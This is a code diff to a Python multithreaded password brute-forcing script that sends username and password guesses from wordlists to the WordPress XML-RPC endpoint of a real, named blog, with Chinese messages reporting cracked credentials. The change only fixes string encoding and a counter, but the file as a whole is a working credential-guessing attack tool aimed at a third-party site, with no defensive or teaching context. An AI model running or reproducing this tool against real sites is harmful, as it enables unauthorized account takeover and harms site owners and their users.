@@ -34,13 +34,13 @@ class exploit(threading.Thread):
             <param><value>{}</value></param>  
             </params>
             </methodCall>
-            '''.format(self.username,password)
+            '''.format(self.username.decode('utf-8'),password.decode('utf-8'))
             result = len(s.post('http://blog.itutorgroup.com/xmlrpc.php',data=postData).text)
             if result == self.errorData:
                 self.num = self.num + 1
             else:
-                print('++++++ 成功爆出账号对应密码'+self.username+'    '+password)
-        print('用户名'+self.username+'此线程已经爆破完成，总共完成'+str(self.num)+'次爆破')
+                print('++++++ 成功爆出账号对应密码'+self.username.decode('utf-8')+'    '+password.decode('utf-8'))
+        print('用户名'+self.username.decode('utf-8')+'此线程已经爆破完成，总共完成'+str(self.num+1)+'次爆破')
 
 if __name__ == "__main__":
     parameter1 = ''
@@ -127,7 +127,7 @@ __      ___ __ ________  ___ __ ___ | |_ __ _ __   ___ ______ _   _ ___  ___
     user = []
     with open(parameter2,'r') as f:
         lines = f.readlines()
-        user = [name.replace('\n','') for name in lines]
+        user = [name.replace('\n','').encode('utf-8') for name in lines]
     with open(parameter3,'r',encoding='utf-8') as f:
         lines = f.readlines()
         paraPWD = [pwd.replace('\n','').encode('utf-8') for pwd in lines]
